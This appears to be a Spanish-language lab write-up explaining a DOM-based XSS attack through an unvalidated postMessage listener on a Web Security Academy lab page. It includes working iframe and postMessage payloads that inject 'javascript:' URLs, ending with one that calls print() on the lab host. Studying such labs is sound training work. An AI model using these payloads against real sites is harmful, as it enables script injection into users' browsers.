El ataque consiste en enviar desde un iframe un mensaje JSON con un campo type establecido en load-channel y un campo url que contiene un payload en forma de URL JavaScript. El listener interno interpreta el mensaje, valida el tipo y actualiza el iframe sin realizar ninguna comprobación de origen ni sanitización.

El resultado es la ejecución directa de la función print en el navegador de la víctima, demostrando cómo la falta de validación y confianza ciega en los datos recibidos puede derivar en una ejecución remota de código.

----

Para este caso, debemos de enviar en el post Message, 2 valores en formato JSON, al hacerlo en la consola se crea un iframe

```html
postMessage({\"type\":\"load-channel\",\"url\":\"https://google.es\"})
```

Ahora podemos hacer un inyeccion en el parametro de URL:

```html
postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:alert(1)\"}");
```

```html
<iframe width=600px height=600px src="https://burpsuite.com" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:alert(1)\"}","*")'></iframe>

<iframe src="https://0a6f00e50303c9608016129c00c3003e.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'></iframe>

```